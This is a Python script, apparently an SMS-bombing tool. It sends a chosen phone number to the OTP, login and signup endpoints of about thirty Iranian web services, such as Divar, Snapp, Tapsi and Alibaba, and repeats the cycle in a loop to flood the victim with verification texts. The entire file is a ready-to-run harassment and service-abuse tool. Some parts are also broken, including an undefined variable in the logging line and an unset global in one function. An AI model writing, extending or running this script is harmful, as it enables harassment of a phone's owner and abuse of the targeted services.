import requests
import json
import random
import string
import time
import re

def curl_sms(url, data, headers=None):
    response = None
    headers = headers or {}
    try:
        response = requests.post(url, data=data, headers=headers)
        response.raise_for_status()
        with open('log.txt', 'a') as log_file:
            log_file.write(f'[{time.strftime("%Y-%m-%d %H:%M:%S")}]--URL={URL}{response.text}\n\n')
        time.sleep(2)
    except Exception as e:
        print(f"Error occurred: {e}")

def divar(phone):
    url = 'https://api.divar.ir/v5/auth/authenticate'
    phone_value = json.dumps({"phone": phone})
    curl_sms(url, phone_value)

def nobatir(phone):
    url = 'https://nobat.ir/api/public/patient/login/phone'
    phone_value = {"mobile": phone}
    headers = {'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary5wscOwxMqnICoiZY'}
    curl_sms(url, phone_value, headers)

def alopeyk_login(phone):
    phone = int(phone)
    url = 'https://api.alopeyk.com/api/v2/login?platform=pwa'
    phone_value = {
        "type": "CUSTOMER",
        "model": "Chrome 111.0.0.0",
        "platform": "pwa",
        "version": "10",
        "manufacturer": "Windows",
        "isVirtual": False,
        "serial": True,
        "app_version": "1.2.9",
        "uuid": True,
        "phone": phone
    }
    headers = {'content-type': 'application/json'}
    curl_sms(url, json.dumps(phone_value), headers)

def shahrefarsh(phone):
    url = 'https://shahrfarsh.com/Account/Login'
    phone_value = 'phoneNumber=' + phone
    curl_sms(url, phone_value)

def digistyle(phone):
    global response
    url = 'https://www.digistyle.com/users/login-register/'
    phone_value = 'loginRegister%5Bemail_phone%5D=' + phone
    curl_sms(url, phone_value)
    token = re.search(r'(?<=token=)(.*)(?=&amp)', response)
    if token:
        token_value = token.group(0)
        confirmation_url = f'https://www.digistyle.com/users/register/confirm/?token={token_value}&type=register'
        requests.get(confirmation_url)

def snapp_express(phone, headers=None):
    url = 'https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=52f02dbc&optionalVersion=5.6.6&UDID=fb000c1a-41a6-4059-8e22-7fb820e6942b'
    phone_value = f'cellphone={phone}&captcha=&optionalLoginToken=true&local='
    curl_sms(url, phone_value, headers)

def azki(phone):
    url = 'https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/'
    phone_value = json.dumps({"phoneNumber": phone})
    headers = {'content-type': 'application/json', 'deviceid': '6'}
    curl_sms(url, phone_value, headers)

def digikala_jet(phone):
    url = 'https://api.digikalajet.ir/user/login-register/'
    phone_value = json.dumps({"phone": phone})
    headers = {'content-type': 'application/json'}
    curl_sms(url, phone_value, headers)

def snapp_drivers(phone):
    url = 'https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=' + phone
    phone_value = json.dumps({"cellphone": phone})
    curl_sms(url, phone_value)

def ostadkar(phone):
    url = 'https://api.ostadkr.com/login'
    phone_value = json.dumps({"mobile": phone})
    curl_sms(url, phone_value)

def miare(phone):
    url = 'https://www.miare.ir/api/otp/driver/request/'
    phone_value = json.dumps({"phone_number": phone})
    headers = {'Content-Type': 'application/json;charset=UTF-8'}
    curl_sms(url, phone_value, headers)

def tapsi_drivers(phone):
    url = 'https://api.tapsi.ir/api/v2.2/user'
    phone_value = json.dumps({
        "credential": {
            "phoneNumber": phone,
            "role": "DRIVER"
        },
        "otpOption": "SMS"
    })
    headers = {'content-type': 'application/json'}
    curl_sms(url, phone_value, headers)

def tapsi_passenger(phone):
    url = 'https://api.tapsi.ir/api/v2.2/user'
    phone_value = json.dumps({
        "credential": {
            "phoneNumber": phone,
            "role": "PASSENGER"
        },
        "otpOption": "SMS"
    })
    headers = {'content-type': 'application/json'}
    curl_sms(url, phone_value, headers)

def banimode(phone):
    url = 'https://mobapi.banimode.com/api/v2/auth/request'
    phone_value = json.dumps({"phone": phone})
    headers = {'Content-Type': 'application/json;charset=UTF-8'}
    curl_sms(url, phone_value, headers)

def drdr(phone):
    url = 'https://drdr.ir/api/v3/auth/login/mobile/init'
    phone_value = json.dumps({"mobile": phone})
    headers = {
        'content-type': 'application/json',
        'client-id': 'f60d5037-b7ac-404a-9e3a-a263fd9f8054'
    }
    curl_sms(url, phone_value, headers)

def taaghche_login(phone):
    url = 'https://gw.taaghche.com/v4/site/auth/login'
    phone_value = json.dumps({"contact": phone, "forceOtp": False})
    headers = {'content-type': 'application/json'}
    curl_sms(url, phone_value, headers)

def taaghche_signup(phone):
    url = 'https://gw.taaghche.com/v4/site/auth/signup'
    phone_value = json.dumps({"contact": phone})
    headers = {'content-type': 'application/json'}
    curl_sms(url, phone_value, headers)

def komodaa(phone):
    url = 'https://api.komodaa.com/api/v2.6/loginRC/request'
    phone_value = json.dumps({"phone_number": phone})
    headers = {'Content-Type': 'application/json'}
    curl_sms(url, phone_value, headers)

def ghabzino(phone):
    url = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode'
    phone_value = json.dumps({
        "Parameters": {
            "ApplicationType": "Web",
            "ApplicationUniqueToken": None,
            "ApplicationVersion": "1.0.0",
            "MobileNumber": phone,
            "UniqueToken": None
        }
    })
    headers = {'content-type': 'application/json'}
    curl_sms(url, phone_value, headers)

def barghe_man(phone):
    url = 'https://uiapi2.saapa.ir/api/otp/sendCode'
    phone_value = json.dumps({"mobile": phone, "from_meter_buy": False})
    curl_sms(url, phone_value)

def vandar(phone):
    url = 'https://api.vandar.io/account/v1/check/mobile'
    phone_value = json.dumps({"mobile": phone})
    headers = {'content-type': 'application/json'}
    curl_sms(url, phone_value, headers)

def mobit(phone):
    url = 'https://api.mobit.ir/api/web/v8/register/register'
    phone_value = json.dumps({"number": phone})
    headers = {'content-type': 'application/json;charset=UTF-8'}
    curl_sms(url, phone_value, headers)

def jabama(phone):
    url = 'https://taraazws.jabama.com/api/v4/account/send-code'
    phone_value = json.dumps({"mobile": phone})
    headers = {'Content-Type': 'application/json'}
    curl_sms(url, phone_value, headers)

def pinorest(phone):
    url = 'https://api.pinorest.com/frontend/auth/login/mobile'
    phone_value = json.dumps({"mobile": phone})
    headers = {'content-type': 'application/json'}
    curl_sms(url, phone_value, headers)

def tetherland(phone):
    url = 'https://service.tetherland.com/api/v5/login-register'
    phone_value = json.dumps({"mobile": phone})
    headers = {'content-type': 'application/json'}
    curl_sms(url, phone_value, headers)

def alibaba(phone_number):
    url = 'https://ws.alibaba.ir/api/v3/account/mobile/otp'
    phone_value = json.dumps({"phoneNumber": phone_number})
    headers = {'Content-Type': 'application/json'}
    curl_sms(url, phone_value, headers)

def drnext(phone):
    url = 'https://cyclops.drnext.ir/v1/patients/auth/send-verification-token'
    phone_value = json.dumps({"source": "besina", "mobile": phone})
    headers = {'content-type': 'application/json'}
    curl_sms(url, phone_value, headers)

def classino(phone):
    url = 'https://student.classino.com/otp/v1/api/login'
    phone_value = json.dumps({"mobile": phone})
    headers = {'Content-Type': 'application/json'}
    curl_sms(url, phone_value, headers)

def takshopaccessorise(phone):
    url = 'https://takshopaccessorise.ir/api/v1/sessions/login_request'
    phone_value = json.dumps({"mobile_phone": phone})
    headers = {'content-type': 'application/json;charset=UTF-8'}
    curl_sms(url, phone_value, headers)

def generate_random_string(length=10):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def main(phone_number):
    while True:
        divar(phone_number)
        nobatir(phone_number)
        alopeyk_login(phone_number)
        shahrefarsh(phone_number)
        digistyle(phone_number)
        snapp_express(phone_number)
        azki(phone_number)
        digikala_jet(phone_number)
        snapp_drivers(phone_number)
        ostadkar(phone_number)
        miare(phone_number)
        tapsi_drivers(phone_number)
        banimode(phone_number)
        drdr(phone_number)
        taaghche_login(phone_number)
        taaghche_signup(phone_number)
        komodaa(phone_number)
        ghabzino(phone_number)
        barghe_man(phone_number)
        vandar(phone_number)
        mobit(phone_number)
        jabama(phone_number)
        pinorest(phone_number)
        tetherland(phone_number)
        alibaba(phone_number)
        drnext(phone_number)
        classino(phone_number)
        takshopaccessorise(phone_number)

        # Call other functions here for other services
        
        decision = input("Do you want to continue? (yes/no): ")
        if decision.lower() != 'yes':
            break

if __name__ == "__main__":
    phone_number = input("Enter your phone number: ")
    main(phone_number)
